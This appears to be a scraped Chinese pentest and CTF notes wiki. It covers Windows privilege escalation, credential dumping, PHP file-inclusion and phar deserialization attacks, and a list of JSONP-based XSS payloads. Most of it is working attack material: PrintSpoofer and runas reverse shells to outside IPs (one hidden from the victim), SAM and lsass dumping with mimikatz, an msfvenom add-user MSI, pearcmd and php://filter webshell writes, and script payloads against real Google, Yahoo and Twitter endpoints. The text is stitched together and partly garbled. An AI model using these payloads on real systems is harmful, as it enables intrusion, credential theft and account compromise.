192.168.1.102 2012 PrintSpoofer您可以使用该选项查看帮助信息font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);-h/font。 C:\\TOOLSPrintSpoofer.exe -hPrintSpoofer v0.1 (by @itm4n) Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()Arguments: -c CMD Execute the command *CMD* -i Interact with the new process in the current command prompt (default is non-interactive) -d ID Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta) -h Thats me :)Examples: - Run PowerShell as SYSTEM in the current console PrintSpoofer.exe -i -c powershell.exe - Spawn a SYSTEM command prompt on the desktop of the session 1 PrintSpoofer.exe -d 1 -c cmd.exe - Get a SYSTEM reverse shell PrintSpoofer.exe -c c:\\Temp c.exe 10.10.13.37 1337 -e cmd 用法 1：启动一个 SYSTEM 进程并与之交互如果你有交互式shell，你可以在当前控制台中创建一个新的 SYSTEM 进程。 使用场景：绑定 shell、反向 shellfont style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);psexec.py/font等。 C:\\TOOLSPrintSpoofer.exe -i -c cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OKMicrosoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system 用法 2：生成一个 SYSTEM 进程并退出如果你可以执行命令但没有交互式 shell，你可以创建一个新的 SYSTEM 进程，然后立即退出而不与之交互。 使用场景：WinRM、WebShellfont style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);wmiexec.py/font等font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);smbexec.py/font。 创建反向 shell： C:\\TOOLSPrintSpoofer.exe -c C:\\TOOLS c.exe 10.10.13.37 1337 -e cmd[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK Netcat 监听器： C:\\TOOLSnc.exe -l -p 1337Microsoft Windows [Version 10.0.19613.1000](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32whoamint authority\\system 用法 3：在桌面上启动 SYSTEM 进程如果您已本地登录或通过 RDP（包括 VDI）登录，则可以在桌面上启动 SYSTEM 命令提示符。首先，使用命令检查您的会话 ID font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);qwinsta/font，然后使用选项指定此值font style=color:rgb(31, 35, 40);background-color:rgba(129, 139, 152, 0.12);-d/font。 使用场景：终端会话（RDP）、VDI C:\\TOOLSqwinsta SESSIONNAME USERNAME ID STATE TYPE DEVICE services 0 Disc console Administrator 1 Activerdp-tcp#3 lab-user 3 Active rdp-tcp 65536 ListenC:\\TOOLSPrintSpoofer.exe -d 3 -c powershell -ep bypass[+] Found privilege: SeImpersonatePrivilege[+] Named pipe listening...[+] CreateProcessAsUser() OK 密码管理员也会重复使用密码，或将其密码保留在一些可读位置的系统上。 注册表大量程序在Windows注册表中存储配置选项。Windows 本身有时会在注册处以纯文本存储密码。 搜索注册表处的密码(手工winPEAS)reg query HKLM /f password /t REG_SZ /s #本地机器注册表项reg query HKCU /f password /t REG_SZ /s #当前用户注册表项 单单第一条命令进行的 HKLM 的搜索，就看到显示有 293 个匹配，而这 293 条结果中还有很多无用的数据有待认为判断处理。可以看出，这种广泛搜索极其的耗费精力！ 相反，我们可以集中精力去查看包含密码的已知注册表项。这样的注册表项是 winlogon，它与 Windows 中被称为 Autologon（自动登录）的功能相关。 font style=color:rgb(68, 68, 68);background-color:rgb(245, 245, 245);reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon/font 除了 Windows 自动登录功能外，某些程序和第三方软件也可能会以不安全的方式在注册表中存储凭据，这些第三方软件的注册表路径如下 reg query “HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP” reg query “HKCU\\Software\\SimonTatham\\PuTTY\\Sessions” reg query “HKCU\\Software\\ORL\\WinVNC3\\Password” reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 v password .\\winPEASany.exe quiet filesinfo userinfo 凭证.\\winPEASany.exe quiet cmd windowscreds 可以使用以下命令查看存储的凭据： cmdkey /list 可以看到，本地管理员账户的凭证已经存储在凭证管理器中，因此可以使用该身份借助 runas 命令去执行命令啦。 凭证管理器的枚举，对于 PowerUp 和 winPEAS 来说都不能够帮到我们，因此，凭证管理器的枚举需要我们手动进行。【PEAS 虽然支持枚举存储的凭证，但使用效果不佳，总是失败。】 虽然这并非真正的“密码搜寻”，但由于用户的密码被保存，而它确实可以为我们提供以其它用户身份运行命令的能力。因此，这实际上等同于在系统中查找某个用户的凭据。 如果尝试运行任意命令（例如“whoami”）时，我们需要将输出内容重定向到文件以读取它。这是因为 runas 会在另外新起的窗口中去执行命令，命令执行结束新起的窗口就被关闭了，因此输出的内容并不会呈现在当前的 shell 窗口中。 runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator cmd.exe /c whoami C:\\temp\\whoami.txt 从上面可以看到，我们确实是以本地管理员帐户的身份运行了 whoami 命令！接下来，就可以使用 runas 来借助 nc.exe 工具来获取反向 shell，命令如下： runas /env /noprofile /savecred /user:DESKTOP-T3I4BBK\\administrator c:\\temp c.exe 172.16.1.30 443 -e cmd.exe 值得一提的是，这可能会在受害者机器上打开 cmd 窗口，导致用户可以轻松关闭它。为此，我们可以使用 PowerShell 从隐藏窗口执行命令，从而增加隐蔽性。这样，受害者那边就不会打开任何窗口，也就不会那么轻松的就杀死我们的 shell。 runas /env /noprofile /savecred /user:JUGG-efrost\\administrator powershell.exe -w hidden -c c:\\temp c.exe 172.16.1.30 443 -e cmd.exe 此外，如果我们拥有对受害者机器的远程桌面权限，那么便不需要像上面那么麻烦，只需使用以下命令即可。 runas /env /noprofile /savecred /user:JUGG-efrost\\administrator cmd 配置文件搜索配置文件常见配置文件位置 C:\\unattend.xml C:\\Windows\\Panther\\Unattend.xml（常见） C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.xml C:\\Windows\\system32\\sysprep\\sysprep.xml 递归式搜索当前目录中以font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);pass/font为名的文件，或以font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.config/font结尾： dir /s *pass* == *.config 递归式搜索当前目录中包含”password”一词的文件，最后也以任何一个font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.xml/font，font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.ini/font，font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);.txt/font findstr /si password *.xml *.ini *.txt .\\winPEASany.exe quiet cmd searchfast filesinfo 或者PowerUp 知道密码后，可以用winexe反弹shell SAMWindows系统下的hash密码格式用户名称:RID:LM-HASH值:NT-HASH值 例如： Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4::: 用户名称为：Administrator RID为：500 LM-HASH值为：C8825DB10F2590EAAAD3B435B51404EE NT-HASH值为：32ED87BDB5FDC5E9CBA88547376818D4 通过SAM文件+mimikatz读取密码windows的用户hash一般是存储在C:\\windows\\system32\\config\\SAM文件中（域控存在NTDS.dit文件中），只不过，就算是管理员权限，也是无法正常打开并读取文件内容，因此一般无法直接通过SAM文件获取用户hash。 reg save hklm\\sam C:\\hash\\sam.hive reg save hklm\\system C:\\hash\\system.hive 将上述获得的sys.hiv和sam.hiv文件复制到mimikatz所在文件夹，运行mimikatz， 输入font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);lsadump::sam /system:sys.hiv /sam:sam.hiv/font，即可导出所有用户密码hash 下载信用套件：git clone https://github.com/Neohapsis/creddump7.git 运行对SAM和系统文件的工具来提取哈希：python2 creddump7/pwdump.py SYSTEM SAM 使用hashcat破解管理员用户哈希：hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt 在 Windows 运行时，文件已锁定。文件的备份可能存在于font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);C:\\Windows\\Repair/font or font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);C:\\Windows\\System32\\config\\RegBack directories/font lsass.exe 进程lsass.exe是一个系统进程，用于本地安全认证，用户的hash信息就存在lsass.exe程序内存中。我们一般就是以lsass.exe进程为目标，使用工具从该进程中dump出已登录用户的hash相关信息 但可以通过注册表导出sam和system文件 procdump64(微软自己的工具)+mimikatzprocdump64.exe -accepteula -ma lsass.exe lsass.dmp 使用本地的mimikatz.exe读取lsass.dmp Scheduled Tasks查看计算机上以管理权限运行的计划任务。schtasks /query /fo LIST /vschtasks /query /fo list /v schtasks.txtschtasks /query /fo LIST /v | findstr 管理员schtasks /query /fo LIST /v | findstr Snipaste 使用AccessChk查看指定目录的权限配置情况。如果我们对以高权限运行的任务所在目录具有写入权限，就可以使用恶意程序覆盖掉原来的程序。 accesschk -dqv C:/Program Files/Snipaste-1.16.2-x86 -accepteula 具有写入权限，将恶意程序放入对应目录下。 执行重启命令。当计划任务下次执行时，就会以高权限运行恶意程序，进而完成提权。成功提权后记得修改回配置。 shutdown -r -t 0 在Windows中可以利用计划任务覆盖原有的程序来进行替换可以使用如下命令查看计算机上的计划任务。font style=color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);schtasks /query /fo LIST /v/font 使用如下命令可以查看指定目录的权限配置情况。如果我们对以高权限运行的任务所在目录具有写入权限，就可以使用恶意程序覆盖掉原来的程序。当计划任务下次执行时，就会以高权限运行恶意程序，进而完成提权。 font style=color:rgb(31, 35, 40);background-color:rgba(175, 184, 193, 0.2);accesschk.exe -dqv D:test -accepteula/font 用户权限前言在Windows中，可以为用户帐户和组分配特定的“特权”。 这些特权授予对某些能力的访问权。其中一些能力可以用来将我们的总体特权提升到系统的权限。 列出用户权限whoami /all SeImpersonatePrivilege可以使用烂土豆 SeAssignPrimaryPrivilege可以使用烂土豆 SeAssignPrimaryPrivilege可以使用烂土豆 SeBackupPrivilege授予对所有对象的读取权限 在系统上，不管他们的ACL使用此权限，用户可以访问敏感的或者从注册表中提取哈希值 然后进行破解或用于传递散列攻击。 SeRestorePrivilegeSeRestorePrivilege授予对系统上所有对象的写访问权，而不管它们的ACL如何。 滥用特权的三种方式： 修改服务二进制文件 覆盖系统进程使用的DLL 修改注册表设置 SeTakeOwnershipPrivilegeSeTakeOwnershipPrivilege允许用户取得所有权，在对象上（写入所有者权限） 一旦您拥有一个对象，就可以修改它的ACL并授予你自己写访问权限 与SeRestorePrivilege使用的方法相同 其他特权(更高级) SeTcbPrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeDebugPrivilege (used by getsystem) 按系统类型 Windows20002003、XPat本地命令提权在 Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以轻松将 Administrators 组下的用户权限提升到 SYSTEM at 是一个发布定时任务计划的命令行工具，语法比较简单。通过 at 命令发布的定时任务计划， Windows 默认以 SYSTEM 权限运行。定时任务计划可以是批处理、可以是一个二进制文件。 语法：at 时间 命令例子：at 10:45PM calc.exe 该命令会发布一个定时任务计划，在每日的 10:45 启动 calc.exe。我们可以通过 “interactive”开启界面交互模式： 在得到一个system的cmd之后，使用 taskmgr 命令调用任务管理器，此时的任务管理器是system权限，然后kill掉explore进程，再使用任务管理器新建explore进程，将会得到一个system的桌面环境 at 配合 msf提权msf下生成木马文件，获取会话之后，然后进入shell at命令执行运行程序， 再开个窗口监听这个端口，上线后即为system windows 78、0308、1216sc命令提权关于sc命令： SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。 sc Create syscmd binPath= cmd /K start type= own type= interact 这个命令的意思是创建一个名叫 syscmd 的新的交互式的 cmd 服务，然后执行以下命令，就得到了一个system权限的cmd环境： sc start systcmd AlwaysInstallElevatedAlwaysInstallElevated 是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。 可以通过查询以下注册表项来识别此设置： [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] “AlwaysInstallElevated”=dword:00000001[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] “AlwaysInstallElevated”=dword:00000001 使用reg query命令查询是否存在漏洞 C: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevatedorC: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 如果系统没这个漏洞，它将输出错误: ERROR: The system was unable to find the specified registry key or value. 如果存在漏洞，上面将输出以下内容: 然后我们使用msfvenom生成msi文件，进行提权 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\\programdata\\rotten.msi# /quiet 安装过程中禁止向用户发送消息# /qn 不使用GUI# /i 安装程序msf下的自动模块exploit/windows/local/always_install_elevated Unattended Installs自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。 全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中： C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ 除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。 C:\\Users\\user\\Desktop dir C:*vnc.ini /s /b /c#或者在名称中包含关键词的项目：C:\\Users\\user\\Desktop dir C:\\ /s /b /c | findstr /sr *password*#或者可以在文件内容中搜索password之类的关键字：C:\\Users\\user\\Desktopfindstr /si password *.txt | *.xml | *.ini#可以查询注册表，例如，字符串password：reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s 在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。 #msf模块post/windows/gather/enum_unattend 第三方软件漏洞提权mysqldocker","tags":[null]},{"title":"include(   .php)","path":"/wiki/WP/文件包含/include(   .php).html","content":"include限制文件后缀if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/flag/i, $c)) include($c..php); else highlight_file(__FILE__); $c 可以用？ 来闭合","tags":[null]},{"title":"pear文件包含","path":"/wiki/WP/文件包含/pear文件包含.html","content":"pear文件包含条件： 有文件包含点 开启了pear扩展 配置文件中register_argc_argv 设置为On,而默认为Off 例题 ?phperror_reporting(0);$file = $_GET[file];if(isset($file) !preg_match(/input|data|phar|log|filter/i,$file)) include $file;else show_source(__FILE__); if(isset($_GET[info])) phpinfo(); 我们利用pear扩展进行文件包含 1、远程文件下载实现远程文件包含poc:/?file=/usr/local/lib/php/pearcmd.phpcaigo+install+R+/var/www/html/+http://xxx.xxx.xxx/1.php 它提示下载到这个目录”tmppeardownload1.php”，我们尝试包含它 2、生成配置文件，配置项传入我们恶意的php代码的形式poc：/?file=/usr/local/lib/php/pearcmd.php+-c+/tmp/ctf.php+-d+man_dir=?eval($_POST[1]);?+-s+ 由于hackbar会尝试编码写入的数据会变成这样%3C?eval($_POST[1]);?%3E;，所以我们使用burp修改一下发包 提示写入成功，尝试包含tmpctf.php 3、写配置文件方式poc:/?file=/usr/local/lib/php/pearcmd.phpaaaa+config-create+/var/www/html/?=`$_POST[1]`;?+1.php 由于可能会遇到前面的编码问题，我们还是用burp 然后访问网站根目录的1.php 因为我们写的poc是符号包起来是的命令执行，要注意不是eval,我们直接用curl反弹 除了pearcmd还有peclcmd","tags":[null]},{"title":"协议&&伪协议","path":"/wiki/WP/文件包含/协议&&伪协议.html","content":"file:php:input # 执行php代码php:filter # 读取源码zip: #压缩文件 1.什么是协议协议呢？就是双方都能听明白的一个沟通约定语言，比如我们说的这个普通话，那么它就是一种协议啊，有了它，我们天南海台北的人都能说一个同一个语调，那么我们东北的贵州的说话互相的才能听得懂，那么在我们计算机中呢也有很多协议 常见的网络层有 IP协议、ICMP协议、ARP协议、IGMP协议 应用层 http协议、https协议、ftp协议、ssh协议、gopher协议、qq拉起协议 2.协议的格式协议头:内容(多为二进制 3.php中的协议file: 访问本地文件系统，在不写协议名字的情况下，就默认是file协议它是支持这个路径混杂模式，什么叫做混杂模式，我们知道在linux下，路径呢一般分为什么对吧，分为相对路径和绝对路径，假设我们使用include包含网站根目录下的flag.php,实际上是包含varwwwhtmlflag.php,它会由相对路径转换为绝对路径 http: 访问 HTTP(s) 网址，可以获取远程的内容，返回到本地，也可以用包含函数包含远程文件，可以直接读取远程的php文件在本地执行，RCE。注意：包含远程文件需在php.ini中将allow_url_include设置为On。 ftp: 默认21端口，进行文件传输的协议 data: data: #执行php代码 ?urldata:textplain, **data:**base64 ?urldata:textplain;base64, 数据（RFC 2397）data: 同样类似与php:input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:流会被当作php文件执行。从而导致任意代码执行。 phar: — PHP 归档 glob: — 查找匹配的文件路径模式 ssh2: — Secure Shell 2 rar: — RAR ogg: — 音频流 expect: — 处理交互式的流 zlib: — 压缩流 zip: bzip2: zlib: 协议： 条件：allow_url_fopen:offon allow_url_include :offon 作⽤：zip: bzip2: zlib: 均属于压缩流，可以访问压缩⽂件中的⼦⽂ 件，更重要的是不需要指定后缀名 ⽤法：zip:[压缩⽂件绝对路径]%23[压缩⽂件内的⼦⽂件名] compress.bzip2:file.bz2 compress.zlib:file.gz 其中phar:和zip:类似","tags":[null]},{"title":"php_filter","path":"/wiki/WP/文件包含/php_filter.html","content":"php:访问各个输入输出流（IO streams），在CTF中经常使用的是php:filter和php:input,php:filter用于读取源码。 基本php:input用于执行php代码 php://filter # 读取源码 write的话GET提交?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOST提交content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=- wirte：写入- convert.base64-decode：对写进文件里的内容先进行一次base64解码，再写入- resource：指定写入的文件名- content提交的值是经过base64编码后的一句话木马//?php assert($_POST[x]);?文件创建成功后，直接蚁剑连接即可 string.rot13?php error_reporting(0);highlight_file(__FILE__);//flag in /flag$file = $_GET[file];$content = $_POST[content];file_put_contents($file,?php die();?.$content);? 这道题就是我们常说的绕过死亡代，因为在中间加上了?php die();?，这就会导致会终止php的执行，不会运行$content的值这里我们用另一个过滤器string.rot13rot13也就是凯撒13，ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。payload:GET提交/?file=php://filter/write=string.rot13/resource=3.phpPOST提交content=?cuc nffreg($_CBFG[k]);?poc解释string.rot13是凯撒13编码content提交的值是经过rot13编码后的一句话木马 补充：php:filter允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器格式为：php:filter 过滤器(read)| 过滤器(write) resource 目标文件参数：resource要过滤的列表read读列表，设置过滤器write写列表，设置过滤器 过滤器字符串过滤器string.rot13 string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。 str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。 string.toupper string.tolower（自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。 strtoupper—将字符串转化为大写 string.tolower （自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。 strtolower—将字符串转化为小写 string.strip_tags使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。 strip_tags—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。它使用与函数fgetss()一样的机制去除标记。 转换过滤器如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。convert.base64convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用base64_encode()和base64_decode()函数处理所有的流数据。convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用line-length个字符为 长度而截成块。如果给出了line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用base64_encode()再加上 chunk_split()相同。 convert.quotedconvert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。 convert.iconv.*这个过滤器需要php支持 iconv ，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 iconv — 字符串按要求的字符编码来转换 convery.iconv.*的使用有两种方法: convert.iconv..orconvert.iconv.123支持的字符编码有一下几种（详细参考官方手册） UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII* 常见过滤器：string.xxx(字符过滤器): string.rot13、string.toupper、string.tolower、string.strip_tagsconvert.xxx (转换过滤器):convert.base64、convert.quoted-printable、convert.iconv等等compression.xxx(压缩过滤):compression.zlib、compression.bzip2、compression.zlib.deflate、compression.bzip2.compress等等mcrypt(加密过滤)：PHP 7.1.0起废弃！ #所以payload（php文件读取使用：convert.xxx (转换过滤器)）第三步：payload为：?filenamephp:filterconvert.iconv.base64*.base64resourceindex.php###发现显示未找到！应该是转换过滤器中的字符编码被禁止了，字符编码字典更换，爆破字符编码。常见字符编码：UCS-4*UCS-4BEUCS-4LE*UCS-4LEUCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win*","tags":[null]},{"title":"有意思的点","path":"/wiki/WP/文件包含/有意思的点.html","content":"先看代码?phpshow_source(__FILE__);echo $_GET[hello];$page=$_GET[page];while (strstr($page, php://)) $page=str_replace(php://, , $page);include($page);? 只过滤了php: 没有考虑大小写，也没有考虑data:按部就班的可以做出来但有一点，代码中的$_GET[‘hello’];好像没啥用，看官方WP 原来可以远程文件包含，构造入下http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E","tags":[null]},{"title":"文件上传","path":"/wiki/WP/文件上传/index.html","content":"phar文件上传绕过 点击阅读详细内容... 📝 文档"},{"title":"phar文件上传绕过","path":"/wiki/WP/文件上传/phar文件上传绕过.html","content":"什么是phar JAR是开发java程序一个应用，包括所有的可执行、可访问的文件都打包进了一个JAR文件里，使得部署过程十分简单。phar是php里类似与JAR的一种打包文件。对于PHP5.3或更高版本。Phar后缀文件是默认开启支持的，可以使用它。 Phar结构 stub:phar文件的标志，必须以 xxx __HALT_COMPILER();? 结尾，否则无法识别。xxx可以为自定义内容。 manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。 content:被压缩文件的内容 signature (可空):签名，放在末尾。 注意：Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化 phar文件上传绕过的本质就是phar反序列化，只不过是需要文件上传点，这个条件是非常苛刻的，要对方存在文件上传，存在文件包含并且支持phar伪协议，存在反序列化漏洞。 直接看题吧 ?phphighlight_file(__FILE__);error_reporting(0);class TestObject public function __destruct() include(flag.php); echo $flag; #大致意思就是我们要反序列化触发__destruct()方法，就会输出flag$filename = $_POST[file];if (isset($filename)) echo md5_file($filename);//post接受一个文件名，如果存在会返回文件的md5值//upload.php 文件上传页面? 我这里不对代码进行过多的讲解了，看注释。 解题步骤：1.生成一个phar文件–2.在mate-data里放置一个包含TestObject()的序列号字符串–3.上传文件–4.md5_file执行phar伪协议，触发反序列化–5.反序列化TestObject()触发__destruck执行echo $flag 生成phar文件 ?phpclass TestObject@unlink(test.phar); //删除之前的test.par文件(如果有)$phar=new Phar(test.phar); //创建一个phar对象，文件名必须以phar为后缀$phar-startBuffering(); //开始写文件$phar-setStub(?php __HALT_COMPILER(); ?); //写入stub$o=new TestObject();$phar-setMetadata($o);//写入meta-data$phar-addFromString(test.txt,test); //添加要压缩的文件$phar-stopBuffering();? 我生成phar的环境使用的是 要在php.ini中修改在这个 然后访问文件，生成phar包，由于有对文件后缀进行白名单过滤，所有修改文件后缀伪jpg 上传文件 包含文件，读取flag","tags":[null]},{"title":"JSONP 绕过","path":"/wiki/Web知识点/xss/JSONP 绕过.html","content":"Google.com script+src=https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)/scriptscript+src=https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)/scriptscript+src=https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)/scriptscript+src=https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)/scriptscript src=https://www.google.com/complete/search?client=chromeq=hellocallback=alert#1/script Blogger.com script src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/scriptscript+src=https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)/script VK.com script+src=http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()/scriptscript+src=http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()/script AlibabaGroup script+src=https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)/scriptscript+src=https://suggest.taobao.com/sug?callback=alert(1337)/scriptscript+src=https://count.tbcdn.cn//counter3?callback=alert(1337)/scriptscript+src=https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)/scriptscript+src=https://wb.amap.com/channel.php?callback=alert(1337)/scriptscript+src=http://a.sm.cn/api/getgamehotboarddata?format=jsonppage=1_=1537365429621callback=confirm(1);jsonp1/scriptscript+src=http://api.m.sm.cn/rest?method=tools.sidercallback=jsonp_1869510867%3balert(1)%2f%2f794/script Uber.com “script+src=https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);/script AOLYahoo script+src=https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?cb=alert(1337)/scriptscript+src=https://mempf.yahoo.co.jp/offer?position=hcallback=alert(1337)/scriptscript+src=https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1)//appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfoliosporttype=2portmax=5rf=http://www.dailyfinance.comcallback=jsonCallback24098%3balert(1)%2f%2f476_=1537149044679/scriptscript+src=https://api.cmi.aol.com/content/alert/homepage-alert?site=usaolcallback=confirm(1);//jQuery20108887725116629929_1528071050373472232_=1528071050374/scriptscript+src=https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504_=1528071050378/scriptscript+src=https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388_=1537274810389/scriptscript+src=https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooterchannel=financeportfolios=truedomain=portfolioscollapsed=1callback=confirm(9)//jQuery21307555521146732187_1538371213486_=1538371213487/scriptscript+src=http://portal.pf.aol.com/jsonmfus/?service=myportfolios,porttype=1portmax=100callback=confirm(9)//jQuery1710788849030856973_1538354104695_=1538354109053/script Twitter.com script+src=http://search.twitter.com/trends.json?callback=alert()/scriptscript+src=https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()/scriptscript+src=https://twitter.com/status/user_timeline/kbeautysalon.json?count=1callback=confirm()/script Others script+src=https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)/scriptscript+src=https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)/scriptscript+src=https://passport.ngs.ru/ajax/check?callback=alert(1337)/scriptscript+src=https://ulogin.ru/token.php?callback=alert(1337)/scriptscript+src=https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)/scriptscript+src=https://appcenter.intuit.com/Account/LogoutJSONP?callback=alert(1337)/scriptscript+src=https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)/scriptscript+src=https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)/scriptscript+src=https://api.mixpanel.com/track/?callback=alert(1337)/scriptscript+src=https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)/scriptscript+src=http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B